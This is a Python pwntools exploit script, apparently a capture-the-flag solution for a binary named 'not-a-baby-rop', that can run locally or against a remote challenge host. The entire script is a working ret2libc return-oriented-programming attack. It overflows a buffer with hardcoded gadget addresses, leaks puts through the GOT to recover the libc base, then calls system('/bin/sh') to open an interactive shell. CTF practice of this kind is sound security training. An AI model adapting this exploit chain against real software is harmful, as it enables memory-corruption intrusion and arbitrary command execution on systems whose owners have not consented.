#!/usr/bin/env python3

from pwn import *

the_binary = "./not-a-baby-rop"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("warzone.hackrocks.com", 7770)
    # libc is from docker image debian:buster-20190610-slim
    libc = ELF("libc6_2.28-10_amd64.so", checksec=False)
else:
    io = process(the_binary)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so", checksec=False)

if args.GDB:
    gdb.attach(io, """
        # ret from warm_up
        break *0x401164

        continue
    """)

class Gadgets:
    # 0x000000000040122b: pop rdi; ret;
    pop_rdi = 0x000000000040122b

    # 0x0000000000401016: ret;
    ret = 0x0000000000401016

rop = b""
rop += b"A"*0x88
rop += p64(Gadgets.pop_rdi)
rop += p64(elf.got.puts)
rop += p64(elf.plt.puts)
rop += p64(elf.sym.main)
assert not any(x in rop for x in [b"\x1a", b"\t", b"\r", b"\n", b" "])
io.sendlineafter(b"got\n", rop)

libc_puts = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc.address = libc_puts - libc.sym.puts
log.info("puts@libc: %#x" % libc_puts)
log.info("libc base: %#x" % libc.address)
bin_sh = next(libc.search(b"/bin/sh\x00"))
if args.REMOTE:
    # For some reason, pwntools is giving us a string address that's 0x1000
    # bytes off for this libc?
    bin_sh -= 0x1000
log.info("/bin/sh: %#x" % bin_sh)

rop = b""
rop += b"A"*0x88
rop += p64(Gadgets.ret)
rop += p64(Gadgets.pop_rdi)
rop += p64(bin_sh)
rop += p64(libc.sym.system)
assert not any(x in rop for x in [b"\x1a", b"\t", b"\r", b"\n", b" "])
io.sendlineafter(b"got\n", rop)

io.interactive()
